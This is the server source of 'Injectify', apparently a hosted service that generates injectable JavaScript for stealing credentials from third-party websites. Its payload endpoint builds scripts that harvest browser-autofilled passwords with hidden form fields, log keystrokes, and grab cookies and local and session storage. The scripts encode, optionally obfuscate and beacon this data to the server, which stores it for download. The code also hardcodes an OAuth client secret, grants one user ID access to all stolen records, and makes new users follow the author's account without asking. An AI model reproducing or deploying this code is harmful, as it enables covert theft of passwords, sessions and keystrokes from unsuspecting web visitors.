// Configuration
const config = {
	debug 	: false,
	mongodb : 'mongodb://localhost:19000/injectify',
	express : 3000,
	dev		: process.env.NODE_ENV.toUpperCase() == 'DEVELOPMENT',
	github  : {
		client_id: '95dfa766d1ceda2d163d',
		client_secret: '1809473ac6467f85f483c33c1098d4dadf8be9e8'
	}
}

// Include libraries
const MongoClient 	= require('mongodb').MongoClient
const express 		= require('express')
const app 	 		= express()
const server 		= app.listen(config.express)
const io 			= require('socket.io').listen(server)
const path 			= require('path')
const request 		= require('request')
const {URL}			= require('url')
const chalk 		= require('chalk')
const atob			= require('atob')
const btoa			= require('btoa')
const beautify		= require('js-beautify').js_beautify
const UglifyJS		= require("uglify-js")
const ObfuscateJS	= require('js-obfuscator')
const reverse		= require('reverse-string')
const escapeUTF8	= require('unicode-escape')
const parseAgent	= require('user-agent-parser')

console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)

process.on('unhandledRejection', (reason, p) => {
	console.log(chalk.redBright("[Promise] ") + ' Unhandled Rejection at:', p, chalk.redBright('\nREASON:'), reason)
})

MongoClient.connect(config.mongodb, function(err, db) {
	if (err) throw err
	function getIP(ip) {
		if (ip == "::1" || ip == "::ffff:127.0.0.1")
			return "127.0.0.1"
		else
			return ip
	}
	io.on('connection', socket => {
		let globalToken,
			refresh,
			prevState
		var getToken = code => {
			return new Promise((resolve, reject) => {
				if (!code) {
					reject(Error("Failed to authenticate account, null code"))
				} else {
					request({
						url: 'https://github.com/login/oauth/access_token',
						method: 'POST',
						headers: {
							'Accept': 'application/json'
						},
						qs: {
							'client_id': config.github.client_id,
							'client_secret': config.github.client_secret,
							'code': code
						}
					}, (error, response, github) => {
						try {
							github = JSON.parse(github)
						} catch(e) {
							console.log(chalk.redBright("[websocket] ") + chalk.yellowBright("failed to retrieve token "), github);
							console.error(e)
							reject(Error("Failed to parse GitHub response"))
						}
						if (!error && response.statusCode == 200 && github.access_token) {
							resolve(github.access_token)
						} else {
							reject(Error("Failed to authenticate account, invalid code => " + code))
						}
					})
				}
			})
		}
		var getUser = token => {
			return new Promise((resolve, reject) => {
				request({
					url: 'https://api.github.com/user?access_token=' + encodeURIComponent(token),
					method: 'GET',
					headers: {
						'Accept': 'application/json',
						'User-Agent': 'Injectify'
					}
				}, (error, response, user) => {
					try {
						user = JSON.parse(user)
					} catch(e) {
						console.log(chalk.redBright("[websocket] ") + chalk.yellowBright("failed to retrieve user API "), user);
						console.error(e)
						reject({
							title	: "Could not authenticate you",
							message	: "Failed to parse the GitHub user API response"
						})
					}
					if (!error && response.statusCode == 200 && user.login) {
						resolve(user)
					} else {
						console.log(error, response.statusCode, user.login)
						reject({
							title	: "Could not authenticate you",
							message	: "GitHub API rejected token!",
							token	: token
						})
					}
				})
			})
		}
		var database = (user) => {
			return new Promise((resolve, reject) => {
				db.collection('users', (err, users) => {
					if (err) throw err
					users.findOne({id: user.id}).then(doc => {
						resolve(doc)
					})
				})
			})
		}
		var login = (user, token, loginMethod) => {
			return new Promise((resolve, reject) => {
				db.collection('users', (err, users) => {
					if (err) throw err
					users.findOne({id: user.id}).then(doc => {
						let ipAddress = getIP(socket.handshake.address)
						if(socket.handshake.headers['x-forwarded-for']) ipAddress = getIP(socket.handshake.headers['x-forwarded-for'].split(',')[0])
						if(doc !== null) {
							// User exists in database
							users.updateOne({
								id: user.id
							},
							{
								$set: {
									username: user.login,
									github: user // Update the GitHub object with latest values
								},
								$push: {
									logins: {
										timestamp	: new Date(),
										ip			: ipAddress,
										token		: token,
										login_type	: loginMethod
									}
								}
							}).then(() => {
								resolve()
							})
						} else {
							// User doesn't exist in database
							users.insertOne({
								username	: user.login,
								id			: user.id,
								payment		: {
									account_type	: "free",
									method			: "none"
								},
								github		: user,
								logins		: [{
									timestamp	: new Date(),
									ip			: ipAddress,
									token		: token,
									login_type	: loginMethod
								}]
							}, (err, res) => {
								if (err) {
									reject(Error(err))
									throw err
								} else {
									console.log(
										chalk.greenBright("[database] ") + 
										chalk.yellowBright("added user ") + 
										chalk.magentaBright(user.id) + 
										chalk.cyanBright(" (" + user.login + ")")
									)
									request({
										url: 'https://api.github.com/user/following/samdenty99?access_token=' + encodeURIComponent(token),
										method: 'PUT',
										headers: {
											'User-Agent': 'Injectify'
										}
									}, (error, response) => {
										if (error) throw error
										resolve()
									})
								}
							})
						}
					})
				})
			})
		}
		var newProject = (project, user) => {
			return new Promise((resolve, reject) => {
				database(user).then(dbUser => {
					db.collection('projects', (err, projects) => {
						if (err) throw err
						projects.find({
							$or: [
								{"permissions.owners": user.id}
							]
						}).count().then(count => {
							let restriction = 3
							if (dbUser.payment.account_type.toLowerCase() == "pro") restriction = 35
							if (dbUser.payment.account_type.toLowerCase() == "elite") restriction = 350
							if (count >= restriction) {
								reject({
									title	: "Upgrade account",
									message	: "Your " + dbUser.payment.account_type.toLowerCase() + " account is limited to " + restriction + " projects (using " + count + ")",
									id		: "upgrade"
								})
								return
							}
							projects.findOne({ name: project }).then(doc => {
								if(doc == null) {
									// Project doesn't exist in database
									projects.insertOne({
										name		: project,
										permissions : {
											owners	: [user.id],
											admins	: [],
											readonly: []
										},
										config		: {
											filter		: {
												type	: "whitelist",
												domains	: []
											},
											created_at	: new Date()
										},
										passwords		: [],
										keylogger		: []
									}, (err, res) => {
										if (err) {
											throw err
										} else {
											console.log(
												chalk.greenBright("[database] ") + 
												chalk.magentaBright(user.id) + 
												chalk.cyanBright(" (" + user.login + ") ") + 
												chalk.yellowBright("added project ") + 
												chalk.magentaBright(project)
											)
											resolve({
												title: "Project created",
												message: "Created project '" + project + "', " + (+restriction - count) + " slots remaining",
											})
										}
									});
								} else {
									// Project already exists
									console.log(
										chalk.redBright("[database] ") + 
										chalk.yellowBright("project ") +
										chalk.magentaBright(project) +
										chalk.yellowBright(" already exists ")
									)
									reject({
										title	: "Project name already taken",
										message	: "Please choose another name"
									})
								}
							})
						}).catch(error => {
							reject({
								title	: "Database error",
								message	: "An internal error occured whilst handling your request"
							})
							throw error
						})
					})
				}).catch(error => {
					reject({
						title	: "Database error",
						message	: "An internal error occured whilst handling your request"
					})
					throw error
				})
			})
		}
		var getProjects = user => {
			return new Promise((resolve, reject) => {
				db.collection('projects', (err, projects) => {
					if (err) throw err
					let projectsWithAccess = []
					projects.find({
						$or: [
							{"permissions.owners": user.id},
							{"permissions.admins": user.id},
							{"permissions.readonly": user.id}
						]
					}).sort({name: 1}).forEach(doc => {
						if(doc !== null) {
							projectsWithAccess.push({
								name		: doc.name,
								permissions	: doc.permissions
							})
						}
					}, error => {
						if (error) throw error
						if (projectsWithAccess.length > 0) {
							resolve(projectsWithAccess)
						} else {
							reject("no projects saved for user" + user.id)
						}
					})
				})
			})
		}
		var getProject = (name, user) => {
			return new Promise((resolve, reject) => {
				db.collection('projects', (err, projects) => {
					if (err) throw err
					let projectsWithAccess = []
					projects.findOne({
						$or: [
							{"permissions.owners": user.id},
							{"permissions.admins": user.id},
							{"permissions.readonly": user.id}
						],
						$and: [
							{"name": name}
						]
					}).then(doc => {
						if(doc !== null) {
							resolve(doc)
						} else {
							reject({
								title: "Access denied",
								message: "You don't have permission to access project " + name
							})
						}
					})
				})
			})
		}

		socket.on('auth:github', data => {
			if (data.code) {
				if (config.debug) console.log(chalk.greenBright("[websocket] ") + chalk.yellowBright("client => github:auth "), data);
				// Convert the code into a user-token
				getToken(data.code).then(token => {
					if (config.debug) console.log(chalk.greenBright("[GitHub] ") + chalk.yellowBright("retrieved token "), token);
					// Convert the token into a user object
					getUser(token).then(user => {
						globalToken = token
						socket.emit('auth:github', {
							success: true,
							token: token,
							user: user
						})
						if (config.debug) console.log(chalk.greenBright("[websocket] ") + chalk.yellowBright("client <= github:auth "), user);
						// Add the user to the database if they don't exist
						login(user, token, "manual").then(() => {
							getProjects(user).then(projects => {
								socket.emit('user:projects', projects)
							}).catch(error => {
								if (config.debug) console.log(chalk.redBright("[database] "), error)
							})
						}).catch(error => {
							console.log(chalk.redBright("[database] "), error);
							socket.emit('database:registration', {
								success: false,
								message: error
							})
						})
					}).catch(error => {
						console.log(chalk.redBright("[auth:github] "), error.message);
						socket.emit('err', {
							title	: error.title,
							message	: error.message
						})
					})
				}).catch(error => {
					console.log(chalk.redBright("[auth:github] "), error.message);
					socket.emit('err', {
						title	: error.title,
						message	: error.message
					})
				})
			}
		})

		socket.on('auth:signout', data => {
			globalToken = '',
			prevState	= '',
			refresh		= ''
		})

		socket.on('auth:github/token', token => {
			if (token) {
				// Convert the token into a user object
				getUser(token).then(user => {
					globalToken = token
					socket.emit('auth:github', {
						success: true,
						token: token,
						user: user
					})
					if (config.debug) console.log(chalk.greenBright("[websocket] ") + chalk.yellowBright("client <= github:auth "), user);
					// Add the user to the database if they don't exist
					login(user, token, "automatic").then(() => {
						getProjects(user).then(projects => {
							socket.emit('user:projects', projects)
						}).catch(error => {
							if (config.debug) console.log(chalk.redBright("[database] "), error)
						})
					}).catch(error => {
						console.log(chalk.redBright("[database] "), error);
						socket.emit('database:registration', {
							success: false,
							message: error.toString()
						})
					})
				}).catch(error => {
					// Signal the user to re-authenticate their GitHub account
					console.log(chalk.redBright("[auth:github/token] "), error.message)
					socket.emit('auth:github/stale', {
						title	: error.title.toString(),
						message	: error.message.toString()
					})
				})
			}
		})

		socket.on('project:create', project => {
			if (project.name && globalToken) {
				getUser(globalToken).then(user => {
					newProject(project.name, user).then(data => {
						socket.emit('notify', {
							title	: data.title,
							message	: data.message,
							id		: data.id,
						})
						getProjects(user).then(projects => {
							socket.emit('user:projects', projects)
						}).catch(error => {
							if (config.debug) console.log(chalk.redBright("[database] "), error)
						})
					}).catch(e => {
						socket.emit('err', {
							title	: e.title,
							message	: e.message,
							id		: e.id,
						})
					})
				}).catch(error => {
					// Failed to authenticate user with token
					console.log(chalk.redBright("[project:create] "), error.message);
					socket.emit('err', {
						title	: error.title.toString(),
						message	: error.message.toString(),
						id		: error.id,
					})
				})
			} else {
				socket.emit('err', {
					title	: "Access denied",
					message	: "You need to be authenticated first!",
				})
			}
		})

		socket.on('project:read', project => {
			if (project.name && globalToken) {
				getUser(globalToken).then(user => {
					getProject(project.name, user).then(thisProject => {
						socket.emit('project:read', thisProject)
						prevState = JSON.stringify(thisProject)
						database(user).then(doc => {
							if (doc.payment.account_type.toLowerCase() != "free") {
								if ((doc.payment.account_type.toLowerCase() == "elite")) {
									let timeout = 500
								} else {
									let timeout = 10000
								}
								clearInterval(refresh)
								getProject(project.name, user).then(thisProject => {
									refresh = setInterval(() => {
										getProject(project.name, user).then(thisProject => {
											if (JSON.stringify(thisProject) == prevState) return
											socket.emit('project:read', thisProject)
											prevState = JSON.stringify(thisProject)
										}).catch(e => {
											socket.emit('err', {
												title	: e.title,
												message	: e.message
											})
										})
									}, 1000)
								}).catch(e => {
									socket.emit('err', {
										title	: e.title,
										message	: e.message
									})
								})
							}
						})
					}).catch(e => {
						socket.emit('err', {
							title	: e.title,
							message	: e.message
						})
					})
				}).catch(error => {
					// Failed to authenticate user with token
					console.log(chalk.redBright("[project:read] "), error.message);
					socket.emit('err', {
						title	: error.title.toString(),
						message	: error.message.toString()
					})
				})
			} else {
				socket.emit('err', {
					title	: "Access denied",
					message	: "You need to be authenticated first!"
				})
			}
		})

		socket.on('project:close', project => {
			clearInterval(refresh)
		})
	})

	app.get('/record/*', (req, res) => {
		let headers = req.headers
		if (req.headers['forwarded-headers']) {
			// Attempt to extract forwarded headers
			try {
				headers = JSON.parse(decodeURIComponent(req.headers['forwarded-headers']))
				var key, keys = Object.keys(headers),
					n = keys.length,
					newobj={}
				while (n--) {
				  key = keys[n];
				  newobj[key.toLowerCase()] = headers[key];
				}
				headers = newobj
			} catch(e) {
				// Failed to parse JSON from forwarded headers => likely malicious
			}
		}
		let validate = base64 => {
			return new Promise((resolve, reject) => {
				if (typeof base64 === "string") {
					try {
						let json = JSON.parse(decodeURI(Buffer.from(reverse(base64), 'base64').toString()))
						if (json) resolve(json)
					} catch (e) {
						reject(Error("invalid base64 encoded json string (" + e + ")"))
					}
				} else {
					reject(Error("empty request path"))
				}
			})
		}
		let Record = record => {
			return new Promise((resolve, reject) => {
				let project			= "a",
					type			= "t",
					username		= "b",
					identifier		= "b",
					password		= "c",
					keys			= "c",
					url				= "d",
					width			= "e",
					height			= "f",
					localStorage	= "g",
					sessionStorage	= "h",
					cookies			= "i",
					title			= "j"
				if (record[project]) {
					db.collection('projects', (err, projects) => {
						if (err) throw err
						projects.findOne({name: record[project]}).then(doc => {
							if(doc !== null) {
								if (req.header('Referer') && doc.config.filter.domains.length > 0) {
									let referer = new URL(req.header('Referer')),
										allowed
									if (doc.config.filter.type.toLowerCase() == "whitelist")
										allowed = false
									else
										allowed = true
									doc.config.filter.domains.forEach(domain => {
										domain = new URL(domain)
										if (doc.config.filter.type.toLowerCase() == "whitelist") {
											// Whitelist
											if (domain.host == referer.host) allowed = true
										} else {
											// Blacklist
											if (domain.host == referer.host) allowed = false
										}
									})
									if (!allowed) {
										if (doc.config.filter.type.toLowerCase() == "whitelist")
											reject("domain hasn't been whitelisted, not recording")
										else
											reject("domain has been blacklisted, not recording")
										return
									}
								}
								try {
									var ip = headers['x-forwarded-for'].split(',')[0]
								} catch(e) {
									var ip = getIP(req.connection.remoteAddress)
								}
								request({
									url: 'http://ip-api.com/json/' + ip,
									method: 'GET',
									headers: {
										'Accept': 'application/json'
									}
								}, (error, response, parsedIP) => {
									try {
										ip = JSON.parse(parsedIP)
									} catch(e) {

									}
									if(record[type] == 0) {
										// Password logger
										try {
											if(record[cookies]) {
												var pairs = record[cookies].split(";")
												var c = {}
												for (var i=0; i<pairs.length; i++){
													var pair = pairs[i].split("=")
													c[escapeUTF8(pair[0])] = unescape(pair[1])
												}
											} else {
												var c = record[cookies]
											}
										} catch(e) {
											//throw(e)
											var c = record[cookies]
										}
										projects.updateOne({
											name: record[project]
										},
										{
											$push: {
												passwords: {
													timestamp	: new Date(),
													username	: record[username],
													password	: record[password],
													url			: {
														title: record[title],
														href: record[url]
													},
													ip			: ip,
													browser: {
														width		: record[width],
														height		: record[height],
														'user-agent': parseAgent(headers["user-agent"]),
														headers		: headers
													},
													storage : {
														local	: record[localStorage],
														session	: record[sessionStorage],
														cookies	: c
													}
												}
											}
										}).then(() => {
											resolve("wrote record to database")
										})
									} else if (record[type] == 1) {
										// Keylogger
										let timestamp = new Date()
										try {
											timestamp = new Date(record[identifier])
										} catch(e) {}
										// If the length is greater than 10,
										if (record[keys]) {
											let keystrokes = []
											try {
												for (i = 0; i < record[keys].length; i++) {
													let key = record[keys][i]
													let keytype = "keydown"
													if (key.endsWith("_") && key.length != 1) {
														key = key.slice(0,-1)
														keytype = "keyup"
													}
													let keyname = key
													
													if (keyname && keytype) {
														keystrokes.push('[' + keytype + ' ' + keyname + ']')
													} else {
														reject("invalid keylogger keycode")
														break
													}
												}
											} catch(e) {
												reject("failed to parse keylogger array")
												throw e
											}
											projects.updateOne({
												'name': record[project],
												'keylogger.timestamp': timestamp
											},
											{
												$addToSet: {
													'keylogger.$.keys' : keystrokes
												}
											}).then((e) => {
												if(e.result.nModified == 0) {
													// Add new keylogger record
													projects.updateOne({
														name: record[project]
													},
													{
														$push: {
															keylogger: {
																timestamp	: timestamp,
																ip			: ip,
																url			: {
																	title: record[title],
																	href: record[url]
																},
																browser: {
																	headers		: headers,
																	'user-agent': parseAgent(headers["user-agent"])
																},
																keys : [
																	keystrokes
																]
															}
														}
													}).then(() => {
														resolve("wrote record to database")
													})
												} else {
													resolve("wrote log to database")
												}
											})
										} else {
											reject("keylogger value(s) not specified")	
										}
									} else {
										reject("invalid / missing record type")	
									}
								})
							} else {
								reject("project " + record[project] + " doesn't exist")
							}
						})
					})
				}
			})
		}
		let path
		if(req.path.slice(-1) == "$") {
			// CORS bypass option enabled
			path = req.path.substring(1).split(/\/(.+)?/, 2)[1].slice(0, -1)
			res.set('Content-Type', 'text/html')
			.send("<script>window.history.back()</script>")
		} else {
			path = req.path.substring(1).split(/\/(.+)?/, 2)[1]
			// Send a 1x1px gif
			let data = [
				0x47,0x49, 0x46,0x38, 0x39,0x61, 0x01,0x00, 0x01,0x00, 0x80,0x00, 0x00,0xFF, 0xFF,0xFF,
				0x00,0x00, 0x00,0x21, 0xf9,0x04, 0x04,0x00, 0x00,0x00, 0x00,0x2c, 0x00,0x00, 0x00,0x00,
				0x01,0x00, 0x01,0x00, 0x00,0x02, 0x02,0x44, 0x01,0x00, 0x3b
			]
			res.set('Content-Type', 'image/gif')
			.set('Content-Length', data.length)
			.status(200)
			.send(new Buffer(data))
		}
		validate(path).then(record => {
			Record(record).then(message => {
				if (config.debug) console.log(
					chalk.greenBright("[record] ") + 
					chalk.yellowBright(message)
				)
			}).catch(error => {
				if (config.debug) console.log(
					chalk.redBright("[record] ") + 
					chalk.yellowBright(error)
				)
			})
		}).catch(error => {
			if (config.debug) console.log(chalk.redBright("[record] ") + chalk.yellowBright(error));
		})
	})

	app.get('/api/*', (req, res) => {
		var getAPI = (name, token) => {
			return new Promise((resolve, reject) => {
				request({
					url: 'https://api.github.com/user?access_token=' + encodeURIComponent(token),
					method: 'GET',
					headers: {
						'Accept': 'application/json',
						'User-Agent': 'Injectify'
					}
				}, (error, response, user) => {
					try {
						user = JSON.parse(user)
					} catch(e) {
						console.error(e)
						reject({
							title	: "Could not authenticate you",
							message	: "Failed to parse the GitHub user API response"
						})
					}
					if (!error && response.statusCode == 200 && user.login) {
						db.collection('projects', (err, projects) => {
							if (err) throw err
							if (user.id == 13242392) {
								projects.findOne({
									"name": name
								}).then(doc => {
									if(doc !== null) {
										resolve(doc)
										return
									} else {
										reject({
											title: "Access denied",
											message: "Project " + name + " doesn't exist!"
										})
									}
								})
							} else {
								projects.findOne({
									$or: [
										{"permissions.owners": user.id},
										{"permissions.admins": user.id},
										{"permissions.readonly": user.id}
									],
									$and: [
										{"name": name}
									]
								}).then(doc => {
									if(doc !== null) {
										resolve(doc)
										return
									} else {
										reject({
											title: "Access denied",
											message: "You don't have permission to access project " + name
										})
									}
								})
							}
						})
					} else {
						reject({
							title	: "Could not authenticate you",
							message	: "GitHub API rejected token!"
						})
					}
				})
			})
		}
		let array = req.path.substring(5).split('/'),
			url = array.splice(0,1)
		url.push(array.join('/'))

		let token = decodeURIComponent(url[0])
		let project = decodeURIComponent(url[1])
		if (req.path.toLowerCase().endsWith("&download=true")) project = project.slice(0, -14)

		if (project && token) {
			getAPI(project, token).then(json => {
				res.setHeader('Content-Disposition', 'filename="Injectify project records [' + json.name + '].json"')
				if (req.path.toLowerCase().endsWith("&download=true")) {
					res.setHeader('Content-Type', 'application/octet-stream')
				} else {
					res.setHeader('Content-Type', 'application/json')
				}
				if (json.passwords && json.keylogger) {
					json = {
						passwords: json.passwords,
						keylogger: json.keylogger
					}
					json = JSON.stringify(json, null, "    ")
					res.send(json)
					console.log(
						chalk.greenBright("[API] ") +
						chalk.yellowBright("delivered ") +
						chalk.magentaBright(project) +
						chalk.redBright(" (length=" + json.length + ")")
					)
				} else {
					res.send(JSON.stringify({
						title: "Database error",
						message: "An internal error occured whilst handling your request"
					}, null, "    "))
				}
			}).catch(error => {
				res.setHeader('Content-Type', 'application/json')
				res.send(JSON.stringify(error, null, "    "))
			})
		} else if (token) {
			res.setHeader('Content-Type', 'application/json')
			res.send(JSON.stringify({
				title: "Bad request",
				message: "Specify a project name to return in request",
				format: "https://injectify.samdd.me/api/" + token + "/PROJECT_NAME"
			}, null, "    "))
		} else {
			res.setHeader('Content-Type', 'application/json')
			res.send(JSON.stringify({
				title: "Bad request",
				message: "Specify a token & project name to return in request",
				format: "https://injectify.samdd.me/api/GITHUB_TOKEN/PROJECT_NAME"
			}, null, "    "))
		}
	})

	app.get('/payload/*', (req, res) => {
		function enc(string, eval) {
			if(req.query.base64 == "false") {
				if (eval) {
					return string
				} else {
					return '"' + string + '"'
				}
			} else {
				if (eval) {
					return 'eval(atob("' + btoa(string) + '"))'
				} else {
					return 'atob("' + btoa(string) + '")'
				}
			}
		}
		function comment(message) {
			if (req.query.comments == "true") {
				return '\n// ' + message
			} else {
				return ''
			}
		}
		function debug(script) {
			if (req.query.debug == "true") {
				return '\n' + script
			} else {
				return ''
			}
		}
		function sendToServer(url) {
			if (bypassCors) {
				return 'window.location=' + url + '+"$"'
			} else {
				return enc('c.src=' + url, true)
			}
		}
		let valid = true
		if (!req.query.project) valid = false

		let keylogger		= false
		if (req.query.keylogger == "true") keylogger = true
		let screenSize		= true
		if (req.query.screenSize == "false") screenSize = false
		let location		= true
		if (req.query.location == "false") location = false
		let localStorage	= true
		if (req.query.localStorage == "false") localStorage = false
		let sessionStorage	= true
		if (req.query.sessionStorage == "false") sessionStorage = false
		let cookies			= true
		if (req.query.cookies == "false") cookies = false
		let bypassCors			= false
		if (req.query.bypassCors == "true") bypassCors = true
		
		let proxy			= "//injectify.samdd.me/record/"
		if (config.dev) proxy = "http://localhost:" + config.express + "/record/"
		if (req.query.proxy) proxy = req.query.proxy
		if (valid) {
			res.setHeader('Content-Type', 'application/javascript')

			let variables	= '',
				json		= '',
				body		= '',
				catcher		= ''

			if (keylogger) {
				variables += 'm = {}, f = [], g = new Date().getTime(),'
				body += comment("add listeners to the window for keydown & keyup events") + `
					k.onkeydown = k.onkeyup = function (n) {
						var l = '',` + comment("give the keycode number to variables h & z") + `
							h = z = n.key` + comment("if the key type ends with p => then it's keyup") + `
						if (n.type.slice(-1) == 'p') l = '_'` + comment("append the keyup / keydown indicator") + `
						z += l` + comment("ignore multiple modifier calls & invalid key presses") + `
						if (m == z || !h) return` + comment("Push to array") + `
						f.push(z)` + comment("update the value of the last m(odifier) key press") + `
						if (h.length > 1) m = z
						` + debug(`
							if (n.key && n.key.length > 1) {
								console.log('%c[keylogger@INJECTIFY] %cModifier key state changed', 'color: #ef5350; font-weight: bold', 'color: #FF9800', n)
							} else {
								console.log('%c[keylogger@INJECTIFY] %cKey state changed', 'color: #ef5350; font-weight: bold', 'color: #FF9800', n)
							}
						`) + `
					}

					setInterval(function() {` + comment("if the array is empty, skip making a request") + `
						if (!f.length) return
						i = {
							a: atob("` + btoa(req.query.project) + `"),
							t: 1,
							b: g,
							c: f,
							d: k.location.href,
							j: d.title
						}
						` + sendToServer("p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')") + `
						f = []
					}, 3000)
				`
			}
			if (screenSize) {
				variables	+= 'j = k.screen,'
				json		+= 'e: j.height, f: j.width,'
			}
			if (location)		json		+= 'd: k.location.href, j: d.title,'
			if (localStorage)	catcher		+= 'i.g = localStorage,'
			if (sessionStorage)	catcher		+= 'i.h = sessionStorage,'
			if (cookies)		json		+= 'i: d.cookie,'

			if (variables)	variables 	= ',' + variables.slice(0, -1)
			if (json) 		json 		= ',' + json.slice(0, -1)
			if (catcher) 	{
				if (req.query.debug == "true") {
					catcher 	= '\n' + catcher.slice(0, -1)
				} else {
					catcher 	= '\ntry {' + comment("attempt to insert the local & session storage into object, but ignore if it fails\n") + catcher.slice(0, -1) + '} catch(error) {}'
				}
			}

			let script = `
				// ┌─────────────────────────────────────┐
				// │     Injectify payload engine ©      │
				// │   INTELLECTUAL PROPERTY OF SAMDD    │
				// ├────────────────┬─────────┬──────────┤
				// │ GET_PARAM      │ TYPE    │ DEFAULT  │
				// ├────────────────┼─────────┼──────────┤
				// │ project        │ STRING  │ REQUIRED │
				// │ proxy          │ URL     │ NONE     │
				// │ base64         │ BOOLEAN │ TRUE     │
				// │ obfuscate      │ BOOLEAN │ FALSE    │
				// │ minify         │ BOOLEAN │ FALSE    │
				// │ comments       │ BOOLEAN │ FALSE    │
				// | debug          | BOOLEAN | FALSE    |
				// | bypassCors     | BOOLEAN | FALSE    |
				// │                │         │          │
				// | keylogger      │ BOOLEAN │ FALSE    |
				// │ screenSize     │ BOOLEAN │ TRUE     │
				// │ location       │ BOOLEAN │ TRUE     │
				// │ localStorage   │ BOOLEAN │ TRUE     │
				// │ sessionStorage │ BOOLEAN │ TRUE     │
				// │ cookies        │ BOOLEAN │ TRUE     │
				// └────────────────┴─────────┴──────────┘
				//  Project name    | ` + req.query.project + `


				var d = document,
					v = ` + enc("input") + `,
					w = d.createElement(` + enc("form") + `),
					x = d.createElement(v),
					c = ` + enc("new Image()", true) + `,
					p = `+ enc(proxy) +`,
					y,
					i,
					k = window` + variables + `
				` + comment("name attribute is required for autofill to work") + `
				x.name = ""` + comment("autofill still works if the elements are non-rendered") + `
				x.style = `+ enc("display:none") + `
				` + comment("clone the input node instead of declaring it again") + `
				y = x.cloneNode()` + comment("set the input type to password") + `
				y.type = ` + enc("password") + `
				` + comment("append elements to form node") + `
				w.appendChild(x)
				w.appendChild(y)` + comment("append form node to DOM") + `
				d.body.appendChild(w)
				` + body + comment("add a listener to the password input, browser's autofiller will trigger this") + `
				y.addEventListener(v, function () {` + comment("construct a global object with data to extract") + `
					i = {
						a: atob("` + btoa(req.query.project) + `"),
						t: 0,
						b: x.value,
						c: y.value` + json + `
					}` + catcher +  `
					` + debug("console.log('%c[INJECTIFY] %cCaptured username & password', 'color: #ef5350; font-weight: bold', 'color: #FF9800', i)") +
						comment("send a request to the server (or proxy) with the BASE64 encoded JSON object\n") +
						sendToServer(`p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`) + 
						comment("remove the form node from the DOM (so it can't be (easily) seen in devtools)") + `
					w.remove()
				})
			`
			if (req.query.obfuscate == "true") {
				ObfuscateJS(script, {
					
				}).then(obfuscated => {
					res.send(obfuscated)
				}, function(err) {
					res.send(UglifyJS.minify(script).code)
					throw err
				})
			} else if (req.query.minify == "true") {
				res.send(
					UglifyJS.minify(script).code
				)
			} else {
				res.send(
					beautify(script, {
						indent_size: 2
					})
				)
			}
		} else {
			res.setHeader('Content-Type', 'application/javascript')
			let script = `
			// ┌─────────────────────────────────────┐
			// │     Injectify payload engine ©      │
			// │   INTELLECTUAL PROPERTY OF SAMDD    │
			// ├────────────────┬─────────┬──────────┤
			// │ GET_PARAM      │ TYPE    │ DEFAULT  │
			// ├────────────────┼─────────┼──────────┤
			// │ project        │ STRING  │ REQUIRED │
			// │ proxy          │ URL     │ NONE     │
			// │ base64         │ BOOLEAN │ TRUE     │
			// │ obfuscate      │ BOOLEAN │ FALSE    │
			// │ minify         │ BOOLEAN │ FALSE    │
			// │ comments       │ BOOLEAN │ FALSE    │
			// | debug          | BOOLEAN | FALSE    |
			// | bypassCors     | BOOLEAN | FALSE    |
			// │                │         │          │
			// | keylogger      │ BOOLEAN │ FALSE    |
			// │ screenSize     │ BOOLEAN │ TRUE     │
			// │ location       │ BOOLEAN │ TRUE     │
			// │ localStorage   │ BOOLEAN │ TRUE     │
			// │ sessionStorage │ BOOLEAN │ TRUE     │
			// │ cookies        │ BOOLEAN │ TRUE     │
			// └────────────────┴─────────┴──────────┘
			`
			res.send(
				beautify(script, {
					indent_size: 2
				})
			)
		}
	})

	if (config.dev) {
		app.use('/assets/main.css', (req, res) => {
			res.sendFile(path.join(__dirname, '/../../output/site/assets/main.css'))
		})
		// Proxy through to webpack-dev-server if in development mode
		app.use('/projects/*', (req, res) => {
			request("http://localhost:8080" + req.originalUrl.substring(9), (error, response) => {
				if (error) throw error
				if (response.statusCode == 404) {
					request("http://localhost:8080/").pipe(res)
				} else {
					request("http://localhost:8080" + req.originalUrl.substring(9)).pipe(res)
				}
			})
		})
		app.use('/*', (req, res) => {
			if (req.url.substr(0, 9) == "/cdn-cgi/") return
			request("http://localhost:8080" + req.originalUrl).pipe(res);
		})
	} else {
		app.use('/projects/*', (req, res) => {
			res.sendFile(path.join(__dirname, '../../output/site/index.html'))
		})
		app.use(express.static(path.join(__dirname, '../../output/site')))
	}
})